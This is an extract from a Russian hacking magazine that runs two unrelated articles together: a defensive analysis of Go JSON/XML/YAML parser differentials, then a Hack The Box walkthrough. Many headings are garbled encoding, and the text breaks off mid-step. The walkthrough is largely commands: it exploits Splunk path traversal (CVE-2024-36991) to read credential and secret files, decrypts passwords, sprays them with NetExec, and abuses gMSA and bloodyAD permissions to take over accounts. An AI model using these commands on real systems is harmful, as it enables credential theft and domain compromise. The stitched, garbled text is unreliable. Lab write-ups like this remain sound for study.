       Распаковы ваем поле с тегом - в форматах JSON, XML и YAML

Хорошо, давай на этот раз все сде лаем пра виль но.


type User struct {
    // Имя пользователя в JSON, если не пустое
    Username string  `json:"username,omitempty"`
    // Пароль в JSON, если не пустой
    Password string  `json:"password,omitempty"`
    // Не отображать признак админа в JSON
    IsAdmin  bool    `json:"-"`
}

Наконец-то! Теперь нет никакой возможнос ти для десериализации поля
IsAdmin .
   Ты, наверное, спросишь: как же эти неправиль ные настройки могут прев -
ратиться в уяз вимос ти в безопасности? Самый банальный способ — это,
как в нашем при мере, исполь зовать -,... как JSON-тег для поля типа
IsAdmin , которое пользователь ни в коем слу чае не должен контролировать.
  Детектить такую штуку обычными юнит-тес тами очень сложно, ведь
без специаль ного теста, который рас паковывает дан ные с ключом - и про -
веряет, изменилось ли поле, ты такой баг не поймаешь. Тут нужны либо
какие-то продвинутые фичи IDE, либо сторонний инструмент.





  Взаимодей ствие с сервером, где пользователь может установить поле
  IsAdmin с помощью поля JSON

Мы раз работа ли публичное пра вило для Semgrep , которое поможет тебе
выявить подоб ные проб лемы в коде. Зацени его в деле:


semgrep -c r/trailofbits.go.unmarshal-tag-is-dash


Îøèáêè ñ omitempty
Еще одна прос тая, но веселая ошибка конфигура ции, с которой мы стал -
кивались рань ше: разработчик по ошибке задал имя поля как omitempty.


// Результат: User{Username:"a_user"}

Если ты установишь для JSON-тега omitempty, то парсер будет использовать
omitempty как имя поля (что ожидаемо). Некоторые разработчики пытались
так хит рить: ста вить omitempty в качестве опции и при этом оставлять стан -
дартное имя поля. Я пошерстил топ-1000 репозиториев на Go в поисках
такого трю ка, и вот что удалось нарыть:
 • Gitea   палился ,   выставляя   наружу   поле   Args   в   структуре
  TranslatableMessage с припиской omitempty (залатано в пул-рек -
   весте #33663 ).
 • Подоб ная история у Kustomize: у него засветилось поле Replacements
   в структуре plugin , тоже с omitempty (поп равлено в #5877 ).
 • Btcd  тоже   отличился ,  выдав  поле  MaxFeeRate   в   структуре
  TestMempoolAcceptCmd с тем самым omitempty .
 • Evcc последовал той же дорожкой, показав поле Message в структуре
  Measurements с ключом omitempty .

Как видишь, разработчики часто хотят установить тег в значение json:",
omitempty" ,  чтобы  сох ранить  имя  по  умол чанию  и  добавить опцию
omitempty.
  В отличие от предыдущего примера, этот вряд ли повлияет на безопас -
ность и должен легко выявляться в тестах. Любая попытка сериализовать
или десери ализовать ввод с ожидаемым именем поля провалится. Однако,
как ни странно, такое все еще встречается даже в популярных опенсор сных
репозитори ях. Мы сделали публичное правило для Semgrep , что бы помочь
тебе находить подобные баги в твоих проектах. Исполь зовать так:


semgrep -c r/trailofbits.go.unmarshal-tag-is-omitempty


ÀÒÀÊÀ 2: ÐÀÇÍÛÅ ÏÀÐÑÅÐÛ — ÐÀÇÍÛÅ ÐÅÇÓËÜÒÀÒÛ

Что произой дет, если разобрать одни и те же данные с помощью разных
JSON-парсеров и они выдадут разные резуль таты? И самое инте ресное —
какие особенности парсеров в Go дают злоумыш ленникам возможность ста -
бильно провоци ровать такие рас хождения?
   Возьмем для примера при ложение, построенное на микросервисной
архи тек туре. В его сос таве:
 • ïðîê ñè-ñåðâèñ , который обра баты вает все зап росы пользователей;
 • ñåðâèñ àâòîðèçàöèè , на который прокси-сервис ссы лается, чтобы про -
   верить, есть ли у поль зователя нужные права для выпол нения его зап роса;
 • набор ñåðâèñîâ áèç íåñ-ëîãèêè , которые прокси-сервис дер гает, чтобы
   реали зовать бизнес-логику.

В этом сценарии обычный пользователь без прав админа пытается выполнить
UserAction — действие, которое ему ðàç ðåøåíî выполнять.





           Пользователь успешно проходит аутен тификацию

Во втором сценарии тот же обычный пользователь пыта ется выполнить
AdminAction — действие, которое ему êàòåãî ðè÷åñêè çàï ðåùåíî .





     Поль зователь пытается вой ти, но аутентификация проваливается

И вот происходит магия: сер висы начинают спо рить о том, что же ты все-таки
пыта ешь ся сделать.





  Службы Proxy и Authorization не согласны в раз боре пользовательского
  вво да, что создает уязвимость в потоке данных

Сервис авторизации, который написан на другом языке программирова ния
или использует нес тандар тный парсер для Go, будет пар сить UserAction
и даст поль зователю пра ва на выполнение операции. А вот прокси-сер вис,
который исполь зует стандартный парсер Go, раз берет AdminAction и отпра -
вит его не тому сер вису. Остается вопрос: какие наг рузки мы можем создать,
чтобы добиться такого поведения?
   Это доволь но популярная архитектура, которую нам доводилось встречать
во время наших аудитов, и именно в ней мы обнаруживали обход аутен -
тификации. Проблемы, о которых мы расскажем ниже, делают это воз -
можным. Есть и дру гие при меры, но боль шинство из них следуют той же
модели: компонент, отве чающий за провер ку безопасности, и компонент,
осуществляющий действия, по-разному видят входные дан ные. Вот несколь -
ко таких при меров в раз личных сце нариях:
 • CVE-2017-12635 : уяз вимость обхо да авторизации в Apache CouchDB из-за
   раз личий JSON-парсеров (очень похоже на наш пример);
 • побег из песочницы macOS из-за различий XML-парсеров (2020);
 • удален ное выполнение кода в Zoom без взаимодействия пользовате ля
   из-за различий XML-парсеров в XMPP (2022, PDF );
 • об ход аутентифика ции SAML в GitLab из-за различий XML-пар серов
   (2025).


Äóáëè ïîëåé
Первая уяз вимость, которую мы разберем, — это дуб лирование ключей. Что
будет, если во вход ном JSON один и тот же ключ встречается дваж ды? А тут
уже все зависит от парсера!
  В Go парсер JSON всегда возь мет ïîñëåäíèé ýëå ìåíò. И такую логику
никак не поменять.


_ = json.Unmarshal([]byte(`{
    "action": "Action1",
    "action": "Action2"
}`), &a)
// Итог: ActionRequest{Action:"Action2"} — последний ключ побеждает!

Это стан дартное поведение боль шинства парсеров. Но, как по казали ребята
из Bishop Fox, 7 из 49 про тес тированных парсеров выбирают первый ключ:
 • Go: jsonparser, gojay;
 • C++: rapidjson;
 • Java: json-iterator;
 •  Elixir: Jason, Poison;
 • Erlang: jsone.

Ни один из них не является самым популярным JSON-парсером для своего
язы ка, хотя некоторые из них весьма рас простра ненные.
   Итак,  если  наш  Proxy  Service  использует  JSON-парсер  на  Go,
а Authorization Service — один из перечис ленных парсеров, мы получаем рас -
хожде ние, как показано на картинке.





        Сценарий ата ки с исполь зованием дублирующих ся полей

XML-парсер ведет себя так же, в то вре мя как YAML-парсер выда ет ошиб ку
при наличии дублирующихся полей. Мы считаем, что все подобные пар серы
должны по умолчанию быть такими же безопасными.





Хотя это и не идеально, но такое поведе ние по край ней мере соответствует
боль шинс тву исполь зуемых парсеров JSON и XML. Теперь давай посмотрим
на более серьезную проб лему, которая поч ти всег да приводит к расхожде -
ниям между парсером Go по умолчанию и любым дру гим пар сером.


Ïîèñê ïî êëþ÷àì áåç ó÷åòà ðåãèñòðà
Парсер JSON в Go распозна ет име на полей без учета регис тра. Пиши action
как action, ACTION или aCtIoN — для парсера это все одно и то же!


_ = json.Unmarshal([]byte(`{
    "aCtIoN": "Action2"
}`), &a)
// Результат: ActionRequest{Action:"Action2"}

Это документированное поведение, но крайне неоче видное. Отключить
это невозможно, и почти ни один дру гой парсер так себя не ведет.
  Мало того, еще и поля могут дублироваться и будет выб ран последний
вари ант, даже если регистр букв отли чается.


_ = json.Unmarshal([] byte(`{
    "action": "Action1" ,
    "aCtIoN": "Action2"
}`), &a)
// Результат: ActionRequest{Action:"Action2"}




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



          ЗЛОУПОТРЕБЛЯЕМ КОСЯКАМИ
             РАЗБОРА JSON, XML И YAML
                В ПРОГРАММАХ НА GO




Это противоречит документации, где ска зано:

      ×òîáû ðàñ ïàðñèòü JSON â ñòðóê òóðó, ìåòîä Unmarshal ñîïîñ òàâëÿåò
     êëþ ÷è âõîäÿùå ãî îáúåêòà ñ êëþ ÷àìè, êîòîðûå èñïîëüçóåò Marshal«
      (ëèáî èìÿ ïîëÿ ñòðóê òóðû, ëèáî åãî òåã), предпочитая точ ное сов -
     падение, но так же принимая сов падение без учета регистра .                »
Ты можешь даже исполь зовать сим волы Unicode! В примере ниже мы исполь -
зуем символ ſ (латин ское долгое s) как s и K (знак Кельвина) как k . В нашем
тес тирова нии библиоте ки JSON, которая выпол няет сравнение, толь ко эти
два символа Unicode соответс твуют ASCII-символам.


type ActionRequest struct {
    Action string `json:"aktions"`
}
a := ActionRequest{}
_ = json.Unmarshal([]byte(`
{
    "aktions": "Action1",
    "aKtionſ": "Action2"
}
`), &a)
fmt.Printf("Result: %#v\n", a)
// Результат: main.ActionRequest{Action:"Action2"}

Да вай пог лядим, как это будет выг лядеть при атаке.





                       Сце нарий атаки

На наш взгляд, это самый жес ткий косяк JSON-парсера в Go, пос коль ку
поведение отли чается от поведения пар серов в JavaScript, Python, Rust, Ruby,
Java и всех осталь ных, которые мы тестирова ли. В результате образова лась
куча серь езных уяз вимос тей, включая те, что нам удалось вскрыть в ходе
ауди тов.
  И последний штрих: отклю чить это поведе ние нельзя, несмотря на то что
пользователи жалуются на ды рявую безопасность уже с 2016 года.
   Это касается толь ко парсера JSON. Парсеры для XML и YAML используют
точные совпадения.





         Изображение, обобщающее работу всех трех парсеров

Если тебя интересуют различия в обра ботке JSON в раз ных парсерах,
рекомендуем прочитать эти два пос та:
 • Parsing JSON is a Mineeld (Николя Серио);
 • JSON Interoperability Vulnerabilities (Бишоп Фокс).


ÀÒÀÊÀ 3: ÏÓÒÀÍÈÖÀ Â ÔÎÐÌÀÒÀÕ ÄÀÍÍÛÕ

Для финальной атаки давай посмотрим, что будет, если распарсить JSON-
файл XML-парсером или использовать какой-нибудь другой неподходящий
формат.
   Возьмем для примера CVE-2020-16250 : бай пас защиты HashiCorp Vault
в методе аутен тифика ции через AWS IAM. Эту уязвимость обнаружила коман -
да Google Project Zero (если интерес но погрузиться в детали, в блоге есть
пост под названи ем Enter the Vault: Authentication Issues in HashiCorp Vault ). Мы
не будем вываливать здесь все тонкости, но в целом вот как выг лядит стан -
дартный процесс аутен тификации HashiCorp Vault через AWS IAM:
 1. AWS-ресурс,  скажем  функция  AWS  Lambda,  подписывает  запрос
   GetCallerIdentity.
 2. Этот запрос отправляется на сервер Vault.
 3. Сервер Vault собира ет запрос и пересылает его в AWS Security Token
   Service (STS).
 4. AWS STS проверяет подпись.
 5. Ес ли все окей, AWS STS возвра щает XML-документ с дан ными о роли.
 6. Сервер Vault парсит XML, извлекает идентификатор и, если у этой роли
   есть доступ к запрашиваемым секретам, отправляет их обратно.
 7. Теперь AWS-ресурс может использовать секреты, например чтобы авто -
   ризоваться в базе данных.





             Про цесс аутентифика ции с помощью Vault

Ко манда Google Project Zero обнаружи ла, что в шаге 2 злоумышленник может
получить слишком большой контроль, включая задание всех заголовков зап -
роса, которые Vault формирует на шаге 3. Особенно критич но, что, установив
заголовок Accept как application/json , AWS STS в шаге 5 вместо ожи -
даемого XML-документа возвращает JSON.
  В ито ге сервер Vault начинает парсить этот JSON с использованием XML-
парсера на Go. А пос коль ку XML-парсер весьма снис ходите лен и умуд ряется
разоб рать почти все, что хоть отда ленно сма хивает на XML, этот хаос
из JSON ста новит ся дос таточ ным для обхода аутен тификации, если есть воз -
можность хотя бы частично управлять JSON-ответом.





             Процесс аутентификации Vault и уязвимость

Да вай разберем три хитрости, позволяющие пар сить файлы некорректным
парсером Go, и создадим файл-полиг лот, который мож но скормить парсерам
JSON, XML и YAML. Каждому парсеру он выдаст свой уникальный результат.


Íåèçâåñòíûå êëþ÷è
По умолчанию парсеры для JSON, XML и YAML не блокируют неиз вес тные
поля — то есть свой ства во входящих данных, которые не соответствуют
ни одному полю в целевой структуре.





  Поведе ние пар серов JSON, XML и YAML при обработке неизвестных
  клю чей


Ìóñîðíûå äàííûå â íà÷àëå
Из  трех парсеров  только XML-пар сер перева ривает мусорные дан ные
в начале.





  Поведе ние пар серов JSON, XML и YAML при наличии мусора в начале
  данных


Ìóñîðíûå äàííûå â êîíöå
Толь ко XML-парсер может проглотить произвольный мусор в конце данных.





  Поведе ние пар серов JSON, XML и YAML при столкновении с мусорными
  данными в конце файла

Исключение составляет использование парсера Decoder API с потоковыми
данными — в этом слу чае JSON-парсер при мет мусор ные данные в конце.
Это от крытая проблема , для которой пока нет зап ланированного решения.





  Поведе ние пар серов JSON, XML и YAML при обработке мусора в конце
  данных с исполь зованием API Decoder


Ñîçäàåì ïîëèãëîò
Как объединить все рас смотренные нами способы поведения, что бы создать
файл-полиглот, который:
 • можно обра ботать парсерами JSON, XML и YAML на Go;
 • воз вра щает раз ные результаты для каж дого парсера?

При годит ся знать, что JSON — это под мно жес тво YAML.




                 Любой файл JSON — это одновре менно и валид -
                     ный файл YAML!


Имея это в виду, мы можем замутить такой полиглот.





       Файл-полиг лот и то, как разные парсеры его интер претируют

Парсер JSON без проблем обрабаты вает наш файл, ведь входные дан ные —
это валид ный JSON. Он просто игнориру ет незнакомые ключи и поз воляет их
дуб лировать. Он выбира ет значение Action_2 , так как сравнение полей
у него нечувс твитель но к регистру и берется значение последнего найден -
ного совпадения.
  Парсер YAML может обра ботать этот файл, потому что входные данные —
это валид ный JSON (а значит, и валид ный YAML), а неиз вес тные ключи он
просто игнорирует. Он цепляет ся за значение Action_1 , поскольку, в отличие
от парсера JSON, дела ет точ ное сопоставление по именам полей.
  На конец, парсер XML способен рас познать наш формат, потому что игно -
рирует все лишнее и ищет лишь данные, которые напоминают XML. Мы спря -
тали их внут ри зна чения JSON. В резуль тате парсер выполняет Action_3 .
   Это мощная отправная точка для проведения атак на основе путаницы
в форматах дан ных. Ана логично обходу HashiCorp Vault.


ÑÏÎÑÎÁÛ ÇÀÙÈÒÛ

Как свести риск к минимуму и сделать пар синг JSON более строгим? Мы бы
хотели:
 • не допускать разбора íå èçâåñ òíûõ êëþ ÷åé в JSON, XML и YAML;
 • не допускать разбора äóá ëèðó þùèõñÿ êëþ ÷åé в JSON и XML;
 • ис клю чить ó÷åò ðåãèñ òðà êëþ ÷åé в JSON (это особенно важ но!);
 • из бегать ìó ñîðà â íà÷àëå XML;
 • из бегать ìó ñîðà â êîí öå JSON и XML.

К сожалению, JSON дает толь ко один способ сде лать парсинг более строгим:
DisallowUnknownFields . Эта фича зап рещает неиз вестные поля во входящем
JSON. YAML предлага ет аналогичную фун кцию KnownFields(true) . А вот
для XML была попыт ка сделать нечто подобное, но пред ложение завернули.
   Чтобы покончить с оставшимися косяками стандартных настроек безопас -
ности, нам при дется сочинить что-то свое, кастомное и нем ного хакерское.
Взгля ни на следующий блок кода с фун кцией strictJSONParse. Это наша
попыт ка сделать раз бор JSON строже, хотя тут есть свои ограничения:
 1. Ïëîõàÿ ïðîèçâîäèòåëüíîñòü : JSON при ходится парсить дважды, что
   замет но замедляет процесс.
 2. Íå ïîë íàÿ äåòåê öèÿ : в некоторых крайних случаях недочеты все-таки
   оста ются, как указано в комментариях к фун кции.
 3. Íèç êèé ïîòåí öèàë âíåä ðåíèÿ : эти меры безопасности не встро ены
   в библиотеки как защищенные настройки по умол чанию или настра -
  иваемые опции, так что массовое рас простра нение вряд ли получится.

Но если ты вдруг обна ружишь уязвимость в своем коде, то даже такое
несовершенное решение может помочь затыкать дыру, пока ты работаешь
над более надежным вари антом.


// DetectCaseInsensitiveKeyCollisions проверяет, есть ли в
JSON-данных ключи, которые различаются только регистром букв. Это
помогает предотвратить скрытые баги, где два ключа с разным
написанием могут ссылаться на одни и те же данные.
func DetectCaseInsensitiveKeyCollisions(data []byte) error {
  // Создаем карту для хранения декодированных JSON-данных и
пытаемся распарсить JSON. Это сохраняет ключи с разным регистром.
  var res map[string]interface{}
  if err := json.NewDecoder(bytes.NewReader(data)).Decode(&res); err
!= nil {
    return err
  }


  seenKeys := make([]string, 0, len(res))


  // Пробежимся по всем ключам в распарсенном JSON и поищем дубликаты
  for newKey := range res {
    for _, existingKey := range seenKeys {
      if strings.EqualFold(existingKey, newKey) {
        // Вернуть ошибку, если найден дубликат без учета регистра
        return fmt.Errorf("найдены дубликаты ключей без учета
регистра:
                        %q и %q", existingKey, newKey)
      }
    }
    seenKeys = append(seenKeys, newKey)
  }
  return nil
}


// Обеспечивает более строгий парсинг JSON с дополнительной
проверкой:
//   1. Отвергает неизвестные поля, которых нет в целевой структуре
//   2. Выявляет дубликаты ключей без учета регистра
//   3. Проверяет полный парсинг без остаточных данных
// strictJSONParse НЕ делает следующее:
//   - Не гарантирует отсутствие дублирующих ключей с одинаковым
регистром
//   - Не проверяет, совпадает ли регистр во входных данных с
ожидаемым регистром в целевой структуре
func strictJSONParse(jsonData []byte, target interface{}) error {
  decoder := json.NewDecoder(bytes.NewReader(jsonData))


  // 1. Запретить неизвестные поля
  decoder.DisallowUnknownFields()


  // 2. Запретить дублирующиеся ключи с разным регистром
  err := DetectCaseInsensitiveKeyCollisions(jsonData)
  if err != nil {
    return fmt.Errorf("strictJSONParse: %w", err)
  }


  // Декодируем JSON в переданную структуру
  err = decoder.Decode(target)
  if err != nil {
    return fmt.Errorf("strictJSONParse: %w", err)
  }


  // 3. Убедимся, что нет остаточных данных после JSON-объекта
  token, err := decoder.Token()
  if err != io.EOF {
    return fmt.Errorf("strictJSONParse: неожиданные дополнительные
данные после JSON: token: %v, err: %v", token, err)
  }


  return nil
}


JSON 2.0
Чтобы фича ста ла массовой и действительно решила проблему на глобаль -
ном уровне, ее нужно вшить в библиотеку и вклю чить по умолчанию. Вот
тут-то и вступает в игру JSON v2 — новая версия библиотеки парсинга JSON
для Go. Пока это только предложение, но огромная работа уже проделана,
и мы надеемся, что совсем скоро этот стандарт выйдет. JSON v2 пре восходит
пер вую версию по мно гим параметрам:
 • Запрещены дублиру ющиеся имена: «...в версии v2 JSON-объ ект с дуб -
   лиру ющи мися именами приводит  к ошибке. Поведение регулируется
   опци ей jsontext.AllowDuplicateNames ».
 • Учи тыва ется регистр при совпадении: «...в v2 поля сов падают точно, с уче -
   том  регис тра.  Опции  MatchCaseInsensitiveNames  и  jsonv1.
  MatchCaseSensitiveDelimiter контролируют это поведе ние».
 • Есть опция RejectUnknownMembers , хотя она не включена по умол чанию
   (ана логична DisallowUnknownFields ).
 • Есть воз можность обрабаты вать данные из io.Reader с помощью фун -
   кции UnmarshalRead , про веряя наличие EOF и не допус кая лишних дан -
   ных в конце.

Хотя это предложение реша ет многие обсуждаемые здесь проб лемы, труд -
ности в эко системе Go сохранятся, пока нов шество не наберет популярность.
Сперва нужно официаль ное одоб рение, после чего разработчикам при дет ся
внедрять это решение в весь сущес твующий код на Go, парсящий JSON. Пока
этого не случит ся, уяз вимос ти продолжат соз давать риски.


ÏÀÌßÒÊÀ ÄËß ÐÀÇÐÀÁÎÒ×ÈÊÀ

 1. Âêëþ ÷è  ñòðîãèé  ïàðñèíã  ïî  óìîë ÷àíèþ.  Для JSON  используй
  DisallowUnknownFields , для YAML — KnownFields(true) .  Увы,
   это все, что реально можно сделать с API пар сера нап рямую в Go.
 2. Ñîõðàíÿé êîí ñèñòåí òíîñòü íà ãðàíèöàõ. Ког да данные проходят через
   несколько сервисов, убедись, что парсинг работает последова тель но, —
   используй  оди наковый  парсер  или  добавь  дополнительные  уровни
   валида ции, нап ример такую штуку, как strictJSONParse .
 3. Ñëå äè çà ïðîã ðåññîì JSON v2. Поглядывай за разработкой библиотеки
  JSON v2 для Go, которая решает массу проб лем, пред лагая более
   безопасные дефол ты.
 4. Èñ ïîëüçóé  ñòàòè÷åñ êèé  àíàëèç.  Вру бай  пра вила  Semgrep,  чтобы
   выловить уязвимые паттерны в своем коде, особен но некорректное
   использование тега - и полей omitempty . Попробуй запус тить созданные
  нами правила.


ÂÛÂÎÄÛ

Мы пред ложили способы смяг чить последс твия и методы обнаруже ния, но в
долгосрочной перспективе все равно придет ся менять подход к работе пар -
серов. Пока биб лиотеки пар серов не выберут безопасность по умол чанию,
разработчикам нуж но держать ухо вос тро.
ВЗЛОМ





Се годня мы про экс плуатируем уязвимость
в монито ринговой системе Splunk, что бы
получить учетные дан ные. Затем для ком -
промета ции нескольких  учетных записей
проэксплуатируем  разрешения,  а  для          hackerralf8@gmail.comRalfHacker
повышения при вилегий скомпрометируем
админскую учетку Splunk и добавим свой
модуль для установления привиле гирован -
ной сес сии.


Наша цель — получение прав суперпользователя на машине Haze с учеб ной
площадки Hack The Box . Уровень задания — сложный.




                     Под ключать ся к машинам с HTB рекомен дуется
                        с применением средств ано ними зации и вир -
                        туализации. Не делай это го с компьютеров, где
                         есть важные для тебя данные, так как ты ока -
                    жешься в общей сети с дру гими участниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
До бавляем IP-адрес машины в /etc/hosts :


10.10.11.61    haze.htb

И запус каем сканирование портов.




Сканирование портов — стандартный первый шаг при любой атаке. Он поз -
воляет ата кующему узнать, какие службы на хос те принимают соединение.
На основе этой информа ции выбира ется следующий шаг к получе нию точки
входа.
  На иболее извес тный инс трумент для сканиро вания — это Nmap. Улучшить
резуль таты его работы ты можешь при помощи сле дующего скрип та:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он дей ству ет в два эта па. На первом произво дится обыч ное быстрое ска -
нирование, на втором — более тщательное ска ниро вание, с использованием
имеющих ся скрип тов (опция -A ).





                    Резуль тат работы скрипта

Сканер нашел 14 откры тых портов:
 • 88 — Kerberos;
 • 135 — Microsoft RPC;
 • 139 — NetBIOS, NetLogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в служ бах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для дос тупа к Global Catalog от клиента к кон троллеру;
 • 3269 (LDAPS) — для дос тупа к Global Catalog от клиента к кон троллеру
   через защищенное соеди нение;
 • 5985 — служба уда ленного управле ния WinRM;
 • порты 8000, 8088, 8089 — система Splunk.

Начнем, конечно же, с прос мотра Splunk.





                    Стра ница авторизации Splunk





                     Стра ница сервиса Splunkd


ÒÎ×ÊÀ ÂÕÎÄÀ

На втором сайте нам открывает ся вер сия Splunk — 9.2.1. Сразу стоит про-
верить, есть ли для нее готовые экс плоиты. Первым делом просто ищем
в Google.





                   Поиск эксплоитов в Google

И находим пост в блоге SonicWall, где подробно разбирается уязвимость
CVE-2024-36991 . Она позволяет обходить пути с эндпо инта /modules/
messaging/ и  читать произвольные файлы. По номеру CVE находим
и рабочий PoC на GitHub. Он поз воляет получать учетные дан ные из базы
данных.


python3 CVE-2024-36991.py -u http://10.10.11.61:8000





                     Проверка уязвимости


ÒÎ×ÊÀ ÎÏÎÐÛ

У нас есть возможность читать фай лы, поэтому прикинем, что может быть
инте ресного. Я не стал заморачиваться и спросил у ChatGPT, какие конфиги
Splunk могут ока заться полез ны, а также что в них содержится.





                   Интерес ные файлы Splunk

В файле server.conf находим зашиф рован ные техничес кие пароли, а в
authentication.conf есть доменные учет ные данные поль зователя Paul
Taylor для связи с LDAP.


curl -s 'http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../
C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/
server.conf'





                 Содер жимое файла server.conf


curl -s 'http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../
C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/system/local/
authentication.conf'





              Содер жимое файла authentication.conf

Чтобы рас шифровать пароли, нам нужен ключ из файла auth/splunk.
secret.


curl -s 'http:/haze.htb:8000/en-US/modules/messaging/C:../C:../C:../
C:../C:../C:../C:../C:../Program%20Files/Splunk/etc/auth/splunk.
secret'



                Содер жимое файла splunk.secret

Когда у нас есть ключ, мы можем использовать скрипт splunksecrets
для расшифровывания паролей. При запуске  указываем файл splunk.
secret, после чего вводим зашифрованные данные и получа ем пароль
в открытом виде.


pip install splunksecrets
splunksecrets splunk-decrypt -S splunk.secret



                     Расшифровывание пароля

У нас есть пароль, но нет логина. По имени пользовате ля можно составить
спи сок всех возможных вариантов учетной записи. Для этого исполь зуем сле -
дующий скрипт.


names = ["Paul Taylor"]
list = []
for name in names:
    n1, n2 = name.split(' ')
    list.append(n1)
    list.append(n1+n2)
    list.append(n1+"."+n2)
    list.append(n1+"-"+n2)
    list.append(n1+"_"+n2)
    list.append(n1+n2[0])
    list.append(n1+"."+n2[0])
    list.append(n1+"-"+n2[0])
    list.append(n1+"_"+n2[0])
    list.append(n2[0]+n1)
    list.append(n2[0]+"."+n1)
    list.append(n2[0]+"-"+n1)
    list.append(n2[0]+"_"+n1)
    list.append(n2)
    list.append(n2+n1)
    list.append(n2+"."+n1)
    list.append(n2+"-"+n1)
    list.append(n2+"_"+n1)
    list.append(n2+n1[0])
    list.append(n2+"."+n1[0])
    list.append(n2+"-"+n1[0])
    list.append(n2+"_"+n1[0])
    list.append(n1[0]+n2)
    list.append(n1[0]+"."+n2)
    list.append(n1[0]+"-"+n2)
    list.append(n1[0]+"_"+n2)


for n in list:
    print(n)

Затем переби раем логины с помощью NetExec и получаем учетную запись
в нужном формате.


nxc smb 10.10.11.61 -u taylor_users.txt -p 'Ld@p_Auth_Sp1unk@2k24'



                 Результат подбора учетных данных

Теперь мы можем переб рать RID объектов домена и тем самым получить
имена групп и поль зовате лей домена.
  Ис поль зуем параметр --rid-brute .


nxc smb 10.10.11.61 -u 'Paul.Taylor' -p 'Ld@p_Auth_Sp1unk@2k24'
--rid-brute





                      Объекты домена

Сохраня ем поль зовате лей домена в отдельный файл и проверяем, не подой -
дет ли имеющий ся у нас пароль еще к какой-нибудь учетной записи. Так мы
скомпрометируем учет ную запись mark.adams .


nxc smb 10.10.11.61 -u users.txt -p 'Ld@p_Auth_Sp1unk@2k24'
--continue-on-success




                 Результат подбора учетных данных

NetExec позволяет проверить, имеет ли пользователь воз можность получить
сес сию через WinRM.


nxc winrm 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'



                 Результат проверки учет ной записи

Для получе ния сес сии через WinRM вос поль зуемся утилитой Evil-WinRM .


evil-winrm -i 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24'





                 Сессия пользователя mark.adams


ÏÐÎÄÂÈÆÅÍÈÅ

В рабочем окружении поль зовате ля ничего интерес ного не находим, поэтому
соберем базу BloodHound.




Ути лита BloodHound исполь зует теорию графов для выявления скрытых
и зачас тую непреднамеренных вза имосвязей в среде Active Directory. Ее мож -
но исполь зовать, чтобы легко иден тифицировать очень слож ные пути атаки.



Для сбора базы BloodHound будем исполь зовать RustHound-CE . Ском -
пилируем версию для Windows, заг рузим на удаленный хост и запустим ска -
нирование.


.\RustHound-CE.exe -d haze.htb -u mark.adams -p
'Ld@p_Auth_Sp1unk@2k24' -c All -z

Данные получаем очень быстро. Ска чиваем итоговый архив и строим граф
от пользователя MARK.ADAMS .





                       Граф BloodHound

Пользователь MARK.ADAMS состоит в группе GMSA_MANAGERS . Эта груп па дол -
жна давать нам пра во управле ния gMSA. Но так как больше никаких свя зей
BloodHound не отоб разил, проверим разрешения записи в атрибуты более
углублен но с помощью bloodyAD .


bloodyAD -d haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --host
10.10.11.61 get writable --right WRITE --detail



                     Разрешения для mark.adams

Та ким обра зом, поль зователь MARK.ADAMS имеет право записи в атри бут
msDS-GroupMSAMembership объ екта Haze-IT-Backup . Этот атрибут содержит
спи сок SID в формате SDDL, для которых разрешено исполь зование учет ных
записей gMSA. Так как у нас есть пра во записи, пропишем в этом атрибуте
учет ку mark.adams .


Set-ADServiceAccount -Identity "Haze-IT-Backup$"
-PrincipalsAllowedToRetrieveManagedPassword mark.adams




Уп равля емые учет ные записи (MSA) — это специальный тип учетных записей
Active Directory, которые можно использовать для безопасного запуска служб,
приложе ний и заданий планировщика.
  Ос новная идея MSA в том, что паролем полностью управляет Active
Directory. Для таких уче ток автоматически генери рует ся слож ный пароль дли -
ной 240 символов, который меняется автомати чески каж дые 30 дней.
Для аутентифика ции используется толь ко Kerberos, так как интерактивный
вход невоз можен. Это связано с тем, что пароль не известен никому и не хра -
нится в локальной сис теме, поэтому его нельзя извлечь из системного про -
цес са LSASS с помощью Mimikatz.
  Но и такими учет ными записями нужно как-то управлять, а это значит, что,
если у нас есть к ним дос туп, мы можем получить хеш пароля.


Извлечем из MSA хеш пароля при помощи NetExec.


nxc ldap 10.10.11.61 -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa




          Получение хеша учетной записи Haze-IT-Backup$




                                     Продолжение статьи →
ВЗЛОМ                         НАЧАЛО СТАТЬИ



          АТАКУЕМ МОНИТОРИНГ SPLUNK,
             ЧТОБЫ ЗАХВАТИТЬ СЕРВЕР
                        НА WINDOWS




Мы скомпромети ровали еще одну учетную запись, проверим ее разрешения
на дру гие объ екты.


bloodyAD -d haze.htb -u 'HAZE-IT-BACKUP$' -p ':
a70df6599d5eab1502b38f9c1c3fd828' --host 10.10.11.61 get writable
--right WRITE --detail



                  Разрешения для HAZE-IT-BACKUP$

Как видишь, учетная запись HAZE-IT-BACKUP$ может переписать владельца
группы Support_Services . Сде лаем себя владель цем группы.


bloodyAD -d haze.htb -u 'HAZE-IT-BACKUP$' -p ':
a70df6599d5eab1502b38f9c1c3fd828' --host 10.10.11.61 set owner
'SUPPORT_SERVICES' 'Haze-IT-Backup$'


                  Ре зультат выполнения команды

Вла делец объ екта AD может наз начать разрешения на объект, поэто му выда -
ем себе полный контроль над группой Support_Services .


bloodyAD -d haze.htb -u 'HAZE-IT-BACKUP$' -p ':
a70df6599d5eab1502b38f9c1c3fd828' --host 10.10.11.61 add genericAll
'SUPPORT_SERVICES' 'Haze-IT-Backup$'


                  Ре зультат выполнения команды

Теперь, когда у нас есть полный доступ к груп пе, сделаем себя ее чле ном.


